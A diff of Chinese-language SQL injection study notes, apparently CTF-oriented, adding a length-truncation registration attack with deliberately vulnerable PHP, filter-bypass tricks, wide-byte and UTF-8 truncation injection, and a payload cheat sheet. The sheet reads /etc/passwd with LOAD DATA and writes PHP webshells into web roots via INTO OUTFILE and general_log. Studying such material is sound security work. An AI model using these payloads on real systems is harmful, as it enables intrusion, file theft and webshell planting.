@@ -2,7 +2,72 @@
 
 ## 约束攻击
 
+我们先通过下列语句建立一个用户表
 
+```
+CREATE TABLE users(
+    username varchar(20),
+    password varchar(20)
+)
+```
+
+注册代码：
+
+```
+<?php
+$conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");
+if (!$conn) {
+    die("Connection failed: " . mysqli_connect_error());
+}
+$username = addslashes(@$_POST['username']);
+$password = addslashes(@$_POST['password']);
+$sql = "select * from users where username = '$username'";
+$rs = mysqli_query($conn,$sql);
+if($rs->fetch_row()){
+    die('账号已注册');
+}else{
+    $sql2 = "insert into users values('$username','$password')";
+    mysqli_query($conn,$sql2);
+    die('注册成功');
+}
+?>
+```
+
+登录判断代码：
+
+```
+<?php
+$conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");
+if (!$conn) {
+    die("Connection failed: " . mysqli_connect_error());
+}
+$username = addslashes(@$_POST['username']);
+$password = addslashes(@$_POST['password']);
+$sql = "select * from users where username = '$username' and password='$password';";
+$rs = mysqli_query($conn,$sql);
+if($rs->fetch_row()){
+    $_SESSION['username']=$password;
+}else{
+    echo "fail";
+}
+?>
+```
+
+在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？
+
+我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。
+
+而对于`SELECT`查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。
+
+通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个`username=admin[25个空格]x&password=123456`的账号，服务器会先查询`admin[25个空格]x`的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为`username=admin[20个空格]&password=123456`。
+
+接着进行登录的时，我们使用：`username=admin&password=123456`进行登录，即可成功登录admin的账号。
+
+防御：
+
+- 给username字段添加unique属性。
+- 使用id字段作为判断用户的凭证。
+- 插入数据前判断数据长度。
 
 ## 心得
 
@@ -10,6 +75,56 @@
 2. 细心观察确定sql注入点(现象:哪里突然没有显示(执行错误),不是预期值.....)
 3. 猜测sql语句的样子(是select,update,insert还是其他什么,字符串使用`'还是"`包围的...)
 4. 判断黑名单和过滤内容
+
+
+
+## 一些小知识
+
+### pdo
+
+PDO可以堆叠注入
+
+
+
+|                    | Mysqli | PDO    | MySQL   |
+| ------------------ | ------ | ------ | ------- |
+| 引入的PHP版本      | 5.0    | 5.0    | 3.0之前 |
+| PHP5.x是否包含     | 是     | 是     | 是      |
+| 多语句执行支持情况 | 是     | 大多数 | 否      |
+
+> 引自：[PDO场景下的SQL注入探究](https://xz.aliyun.com/t/3950)
+
+### select语句的格式
+
+```
+SELECT
+    [ALL | DISTINCT | DISTINCTROW ]
+      [HIGH_PRIORITY]
+      [STRAIGHT_JOIN]
+      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
+      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
+    select_expr [, select_expr ...]
+    [FROM table_references
+      [PARTITION partition_list]
+    [WHERE where_condition]
+    [GROUP BY {col_name | expr | position}
+      [ASC | DESC], ... [WITH ROLLUP]]
+    [HAVING where_condition]
+    [ORDER BY {col_name | expr | position}
+      [ASC | DESC], ...]
+    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
+    [PROCEDURE procedure_name(argument_list)]
+    [INTO OUTFILE 'file_name'
+        [CHARACTER SET charset_name]
+        export_options
+      | INTO DUMPFILE 'file_name'
+      | INTO var_name [, var_name]]
+    [FOR UPDATE | LOCK IN SHARE MODE]]
+```
+
+
+
+
 
 
 
@@ -92,7 +207,36 @@
 
  https://security.yirendai.com/news/share/15 
 
+ https://xz.aliyun.com/t/7169# 
+
 ## 绕过
+
+
+
+### 利用php preg_match的回溯次数绕过正则
+
+> PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限`pcre.backtrack_limit`。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数(默认为 100万)，那么正则停止，返回未匹配到数据。
+
+
+
+### 数字被拦截
+
+```
+false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K
+true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L
+true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M
+floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N
+ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O
+floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P
+ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q
+ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R
+floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S
+floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T
+```
+
+
+
+
 
 ### 过滤表名的情况下查询
 
@@ -122,6 +266,7 @@ select a from b='' or substr((hex((select group_concat(a) from (select 1,2,3`a`,
 2. 使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格
 3. 使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a
 4. ^,&&,||,括号综合利用
+5. `and/or`后面可以跟上`奇数个!、偶数个~`可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略
 
 ### 绕过引号限制
 
@@ -169,7 +314,11 @@ EXECUTE sqla;  //执行预定义SQL语句
 
 
 
-### 宽字节注入 
+### 宽字节注入
+
+#### gbk
+
+
 
 - 作用
 
@@ -179,11 +328,66 @@ EXECUTE sqla;  //执行预定义SQL语句
 
 	- 反斜杠 \ 的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。
 
+#### latin1 与 utf-8
+
+
+
+```
+<?php
+//该代码节选自：离别歌's blog
+$mysqli = new mysqli("localhost", "root", "root", "cat");
+
+
+$mysqli->query("set names utf8");
+
+$username = addslashes($_GET['username']);
+
+/* Select queries return a resultset */
+$sql = "SELECT * FROM `table1` WHERE username='{$username}'";
+$result = $mysqli->query( $sql )
+$mysqli->close();
+?>
+```
+
+
+
+
+
+`$mysqli->query("set names utf8");`这么一行代码，在连接到数据库之后，执行了这么一条SQL语句。
+
+上边在gbk宽字节注入的时候讲到过：`set names utf8;`相当于：
+
+```
+mysql>SET character_set_client ='utf8';
+mysql>SET character_set_results ='utf8';
+mysql>SET character_set_connection ='utf8';
+```
+
+>SQL语句会先转成`character_set_client`设置的编码。但，他接下来还会继续转换。`character_set_client`客户端层转换完毕之后，数据将会交给`character_set_connection`连接层处理，最后在从`character_set_connection`转到数据表的内部操作字符集。 
+
+我们输入：`?username=admin%c2`，`%c2`是一个Latin1字符集不存在的字符。
+
+由上述，可以简单的知道：%00-%7F可以直接表示某个字符、%C2-%F4不可以直接表示某个字符，他们只是其他长字节编码结果的首字节。
+
+但是，这里还有一个Trick：Mysql所使用的UTF-8编码是阉割版的，仅支持三个字节的编码。所以说，Mysql中的UTF-8字符集只有最大三字节的字符，首字节范围：`00-7F、C2-EF`。
+
+而对于不完整的长字节UTF-8编码的字符，若进行字符集转换时，会直接进行忽略处理。
+
+利用这一特性，我们的payload为`?username=admin%c2`，此处的`%c2`换为`%c2-%ef`均可。
+
+```
+SELECT * FROM `table1` WHERE username='admin'
+```
+
+因为`admin%c2`在最后一层的内部操作字符集转换中变成`admin`。
+
+
+
 ### 函数代替
 
 - mid与substr
 - limit x,x与group_cat()
-- substr(,,)与substr( from x for x)
+- substr(,,)与substr( from x for x) 与 order by
 - concat
 
 	- make_set(3,'~',version())
@@ -191,11 +395,14 @@ EXECUTE sqla;  //执行预定义SQL语句
 	- repeat((version()),2)
 	- 来源:http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/
 
+
+
 ### 杂
 
 -  or <->||
 -  and <->&&
 -  不要忘记 ^
+-  直接拼接`=`号，如：`?id=1=(condition)`来代替and / or 
 - =<>    <=>    in/between/like
 
   - SELECT 1 WHERE 1 = 1 ó SELECT 1 WHERE 1 IN (1)
@@ -219,9 +426,51 @@ select * from flags where id='abcdd' union select 1,(select group_concat(b,e,f,g
 
 
 
-## 注入语句备忘 
+## 注入语句备忘
 
-### 数据库名 
+
+
+### 查询表结构(爆字段名)
+
+
+
+`show create table table_name;`
+
+
+
+### handler代替select查询
+
+```
+handler FlagHere open;handler FlagHere read first;
+
+handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名
+handler yunensec read first; #读取指定表/句柄的首行数据
+handler yunensec read next; #读取指定表/句柄的下一行数据
+handler yunensec read next; #读取指定表/句柄的下一行数据
+...
+handler yunensec close; #关闭句柄
+```
+
+
+
+handler 的语法
+
+```
+HANDLER tbl_name OPEN [ [AS] alias]
+
+HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ { FIRST | NEXT }
+    [ WHERE where_condition ] [LIMIT ... ]
+
+HANDLER tbl_name CLOSE
+```
+
+
+
+### 数据库名
 
 - SELECT database();
 - SELECT schema_name FROM information_schema.schemata;
@@ -358,6 +607,118 @@ mysql> select '<?php eval($_POST[request]);?>'#开始写shell,这里就是个普
 ##写完之后记得恢复
 mysql> set global general_log_file = 'C:\phpStudy\MySQL\data\stu1.log';
 mysql> set global general_log = off;
+```
+
+
+
+### 可以分支的语句
+
+```
+ELT(N ,str1 ,str2 ,str3 ,…)
+函数使用说明：若 N = 1 ，则返回值为 str1 ，若 N = 2 ，则返回值为 str2 ，以此类推。 若 N 小于 1 或大于参数的数目，则返回值为 NULL 。 ELT() 是 FIELD() 的补数
+
+
+```
+
+```
+FIELD(str, str1, str2, str3, ……)
+
+mysql> select * from bsqli where id = 1 and field(1>1,sleep(1));
++----+--------+----------+
+| id | name   | password |
++----+--------+----------+
+|  1 | K0rz3n | 123456   |
++----+--------+----------+
+1 row in set (2.00 sec)
+
+mysql> select * from bsqli where id = 1 and field(1=1,sleep(1));
+Empty set (1.00 sec)
+```
+
+```
+if
+```
+
+```
+case when condition then 1 else 0 end
+```
+
+
+
+### 读/写文件
+
+#### 读
+
+Mysql读取文件通常使用load_file函数，语法如下：
+
+```
+select load_file(file_path);
+```
+
+第二种读文件的方法：
+
+```
+load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取服务端文件
+```
+
+第三种：
+
+```
+load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取客户端文件
+```
+
+限制：
+
+- 前两种需要`secure-file-priv`无值或为有利目录。
+- 都需要知道要读取的文件所在的绝对路径。
+- 要读取的文件大小必须小于`max_allowed_packet`所设置的值
+
+
+
+#### 低权限读取文件
+
+5.5.53`secure-file-priv=NULL`读文件payload，mysql8测试失败，其他版本自测。
+
+```
+drop table mysql.m1;
+CREATE TABLE mysql.m1 (code TEXT );
+LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';
+select * from mysql.m1;
+```
+
+
+
+#### 服务端读取客户端文件
+
+
+
+这个漏洞是mysql的一个特性产生的
+
+简单描述该漏洞：Mysql客户端在执行`load data local`语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。
+
+利用脚本:`https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py`
+
+#### 写
+
+```
+select 1,"<?php @assert($_POST['t']);?>" into outfile '/var/www/html/1.php';
+select 2,"<?php @assert($_POST['t']);?>" into dumpfile '/var/www/html/1.php';
+```
+
+限制：
+
+- `secure-file-priv`无值或为可利用的目录
+- 需知道目标目录的绝对目录地址
+- 目标目录可写，mysql的权限足够。
+
+#### 通过日志写文件
+
+```
+mysql> set global general_log_file = '/var/www/html/1.php';
+mysql> set global general_log = on;
+//慢查询日志
+mysql> set global slow_query_log_file='/var/www/html/2.php'
+mysql> set global slow_query_log=1;
 ```
 
 
